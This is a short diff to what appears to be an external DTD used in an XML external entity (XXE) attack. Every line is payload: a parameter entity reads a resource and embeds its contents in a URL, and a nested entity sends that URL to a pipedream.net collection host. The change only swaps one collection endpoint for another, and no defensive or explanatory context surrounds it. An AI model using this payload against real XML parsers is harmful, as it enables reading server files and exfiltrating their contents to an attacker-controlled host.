@@ -1,3 +1,3 @@
 <!ENTITY % x SYSTEM "amit">
-<!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'https://enwpg2wktdnp.x.pipedream.net/?%x;'>">
+<!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'https://en6ho54cbucv.x.pipedream.net/?%x;'>">
 %paramEntity;
